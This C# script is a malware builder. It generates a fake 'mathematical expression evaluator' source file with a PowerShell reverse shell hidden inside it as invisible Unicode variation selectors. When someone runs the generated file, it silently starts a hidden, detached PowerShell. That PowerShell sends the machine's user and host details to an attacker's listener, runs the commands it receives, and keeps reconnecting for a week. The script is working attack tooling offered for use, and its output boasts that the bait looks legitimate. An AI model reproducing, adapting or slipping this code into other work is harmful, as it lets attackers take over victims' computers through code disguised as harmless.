// BaitGenerator.cs - C# bait file generator with hidden Unicode payload
// =============================================================================
// Generates BaitEvaluator.cs with the reverse shell payload encoded in
// Unicode Variation Selectors (U+FE00-FE0F and U+E0100-E01EF).
//
// Technique: Detached process with PowerShell -EncodedCommand
//   - pwsh first, then powershell (prioritizes modern versions)
//   - Reconnection with backoff (5s, +3, reset at >=60s, max 7 days)
//   - System fingerprint sent to listener
//   - Detached process (survives terminal closing)
//
// NOTE: This technique is Windows-specific.
//   Requires PowerShell installed (available on Windows by default).
//
// Usage: dotnet script BaitGenerator.cs <IP> <PORT>
//        dotnet script BaitGenerator.cs --ip <IP> --port <PORT>

using System;
using System.IO;
using System.Text;

// --- Argument parsing --------------------------------------------------------

string argIp = null;
int argPort = 0;

{
    var a = args;
    for (int i = 0; i < a.Length; i++)
    {
        if (a[i] == "--ip" && i + 1 < a.Length) { argIp = a[++i]; }
        else if (a[i] == "--port" && i + 1 < a.Length) { int.TryParse(a[++i], out argPort); }
        else if (!a[i].StartsWith("--"))
        {
            if (argIp == null) argIp = a[i];
            else if (argPort == 0) int.TryParse(a[i], out argPort);
        }
    }
}

if (argIp == null || argPort == 0)
{
    string name = "dotnet script BaitGenerator.cs --";
    Console.WriteLine("\x1b[36m\u2554" + new string('\u2550', 56) + "\u2557");
    Console.WriteLine("\u2551  BAIT GENERATOR \u2014 C# / PowerShell Detached            \u2551");
    Console.WriteLine("\u255a" + new string('\u2550', 56) + "\u255d\x1b[0m");
    Console.WriteLine();
    Console.WriteLine($"Usage: {name} <IP> <PORT>");
    Console.WriteLine($"       {name} --ip <IP> --port <PORT>");
    Console.WriteLine();
    Console.WriteLine("  IP     IP or domain where your listener is running");
    Console.WriteLine("  PORT   Listener port");
    Console.WriteLine();
    Console.WriteLine("Examples:");
    Console.WriteLine($"  Same network:  {name} 192.168.1.6 4444");
    Console.WriteLine($"  With ngrok:    {name} 8.tcp.ngrok.io 10914");
    Console.WriteLine($"  Same PC:       {name} 127.0.0.1 4444");
    Console.WriteLine();
    Environment.Exit(1);
}

if (argPort < 1 || argPort > 65535)
{
    Console.WriteLine("\x1b[31m[!] Error: port must be a number between 1 and 65535\x1b[0m");
    Environment.Exit(1);
}

// --- Payload: reverse shell client in PowerShell with reconnect --------------

string PAYLOAD = @"
$LISTENER_IP = '__LISTENER_IP__'
$PORT = __LISTENER_PORT__
$w = 5
$end = (Get-Date).AddDays(7)

while ((Get-Date) -lt $end) {
    try {
        $client = New-Object Net.Sockets.TcpClient($LISTENER_IP, $PORT)
        $stream = $client.GetStream()
        $reader = New-Object IO.StreamReader($stream)
        $writer = New-Object IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $w = 5

        $sep = [string]::new([char]0x2500, 50)
        $fi = @(
            '  OS      : ' + [Environment]::OSVersion.VersionString,
            '  Shell   : PowerShell ' + $PSVersionTable.PSVersion,
            '  User    : ' + $env:USERNAME,
            '  Hostname: ' + $env:COMPUTERNAME,
            '  Arch    : ' + $env:PROCESSOR_ARCHITECTURE,
            '  CWD     : ' + (Get-Location),
            '  PID     : ' + $PID
        )
        $writer.WriteLine($sep)
        $fi | ForEach-Object { $writer.WriteLine($_) }
        $writer.WriteLine($sep)

        while ($client.Connected) {
            $writer.Write('PS> ')
            $cmd = $reader.ReadLine()
            if ($cmd -eq 'exit') { break }
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                $output = $_.Exception.Message
            }
            $writer.WriteLine($output)
        }
    } catch {}
    finally {
        if ($client) { $client.Close() }
    }
    Start-Sleep -Seconds $w
    if ($w -ge 60) { $w = 5 } else { $w = $w + 3 }
}
".Replace("__LISTENER_IP__", argIp).Replace("__LISTENER_PORT__", argPort.ToString());

// --- Variation Selectors encoder ---------------------------------------------

static string Encode(string text)
{
    var sb = new StringBuilder();
    foreach (byte b in Encoding.UTF8.GetBytes(text))
    {
        int cp = b < 16 ? 0xFE00 + b : 0xE0100 + b - 16;
        sb.Append(char.ConvertFromUtf32(cp));
    }
    return sb.ToString();
}

// --- Generate BaitEvaluator.cs with embedded payload -------------------------

string invisible = Encode(PAYLOAD);

string archivo = $$"""
// BaitEvaluator.cs - Mathematical expression evaluator in C#
// Allows evaluating formulas and symbolic expressions at runtime.
// Usage: dotnet run -- "2 + 2 * Math.PI"
// Requires: .NET 6+

using System;
using System.Diagnostics;
using System.Text;

static byte[] DecodeContext(string s)
{
    var result = new System.Collections.Generic.List<byte>();
    foreach (var c in s.EnumerateRunes())
    {
        int cp = c.Value;
        if (cp >= 0xFE00 && cp <= 0xFE0F)       result.Add((byte)(cp - 0xFE00));
        else if (cp >= 0xE0100 && cp <= 0xE01EF) result.Add((byte)(cp - 0xE0100 + 16));
    }
    return result.ToArray();
}

const string _ctx = "{{invisible}}";

static string FindShell()
{
    foreach (var name in new[] { "pwsh", "powershell" })
    {
        try
        {
            using var p = Process.Start(new ProcessStartInfo("where", name)
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true });
            p!.WaitForExit();
            if (p.ExitCode == 0) return name;
        }
        catch { }
    }
    return "powershell";
}

string userExpression = args.Length > 0 ? string.Join(" ", args) : "1 + 1";

if (_ctx.Length > 0)
{
    string payload = Encoding.UTF8.GetString(DecodeContext(_ctx));
    string shell = FindShell();
    string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(payload));

    try
    {
        Process.Start(new ProcessStartInfo(shell,
            "-NoLogo -NoProfile -WindowStyle Hidden -EncodedCommand " + encoded)
        {
            CreateNoWindow = true,
            UseShellExecute = false
        });
    }
    catch { }
}

Console.WriteLine($"Evaluating: {userExpression}");
try
{
    using var evaluator = Process.Start(new ProcessStartInfo(FindShell(),
        $"-NoLogo -NoProfile -Command \"Write-Output ({userExpression})\"")
    {
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true
    });
    Console.WriteLine($"Result: {evaluator!.StandardOutput.ReadToEnd().Trim()}");
    evaluator.WaitForExit();
}
catch (Exception ex)
{
    Console.WriteLine($"Error: {ex.Message}");
}
""";

string outDir = "Bait To Client";
Directory.CreateDirectory(outDir);
File.WriteAllText(Path.Combine(outDir, "BaitEvaluator.cs"), archivo, Encoding.UTF8);
File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), ".last_target"), $"{argIp}\n{argPort}\n");

// --- Stats -------------------------------------------------------------------

int payloadBytes      = Encoding.UTF8.GetByteCount(PAYLOAD);
int invisibleChars    = invisible.Length;
int invisibleWeight   = Encoding.UTF8.GetByteCount(invisible);
int totalArchivo      = Encoding.UTF8.GetByteCount(archivo);
int visibleWeight     = totalArchivo - invisibleWeight;

static string Kb(int n) => $"{n / 1024.0:F1} KB";

Console.WriteLine("\x1b[36m\u2554" + new string('\u2550', 56) + "\u2557");
Console.WriteLine("\u2551  BAIT GENERATOR \u2014 C# / PowerShell Detached            \u2551");
Console.WriteLine("\u255a" + new string('\u2550', 56) + "\u255d\x1b[0m");
Console.WriteLine();
Console.WriteLine("\x1b[33m[*] Configuration\x1b[0m");
Console.WriteLine($"    LISTENER_IP : {argIp}");
Console.WriteLine($"    PORT        : {argPort}");
Console.WriteLine();
Console.WriteLine("\x1b[33m[*] Encoded payload\x1b[0m");
Console.WriteLine($"    {payloadBytes} bytes \u2192 {invisibleChars} invisible characters (Unicode Variation Selectors)");
Console.WriteLine($"    Hidden payload weight: {Kb(invisibleWeight)}");
Console.WriteLine();
Console.WriteLine("\x1b[32m[\u2713] Generated file \u2192 Bait To Client/BaitEvaluator.cs\x1b[0m");
Console.WriteLine("    Technique      : PowerShell -EncodedCommand (detached process)");
Console.WriteLine($"    Visible size   : {Kb(visibleWeight)}  \u2190 what the file recipient sees");
Console.WriteLine($"    Actual size    : {Kb(totalArchivo)}  \u2190 true size on disk");
Console.WriteLine($"    Difference     : +{Kb(invisibleWeight)} of invisible characters");
Console.WriteLine();
Console.WriteLine("\x1b[32m[\u2713] Bait file generated successfully.\x1b[0m");
Console.WriteLine("    The payload is invisible to the human eye \u2014 the bait looks like legitimate code.");
Console.WriteLine();
Console.WriteLine();
